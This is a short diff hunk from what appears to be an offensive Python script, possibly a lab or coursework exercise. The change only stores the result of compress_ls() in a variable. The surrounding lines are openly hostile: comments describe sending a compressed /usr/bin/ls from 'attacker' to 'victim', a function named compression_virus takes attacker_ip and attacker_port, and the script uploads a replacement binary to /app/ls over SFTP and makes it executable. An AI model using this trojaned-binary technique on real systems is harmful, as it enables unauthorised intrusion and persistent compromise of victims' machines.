@@ -149,7 +149,8 @@ def main():
 
         # compress the /usr/bin/ls file in attacker
         # then send the compressed file to the victim
-        compression_virus(attacker_ip, attacker_port, compress_ls())
+        ls_zip = compress_ls()
+        compression_virus(attacker_ip, attacker_port, ls_zip)
         sftp = client.open_sftp()
         sftp.put('./temp_ls', '/app/ls')
         client.exec_command('chmod +x /app/ls')
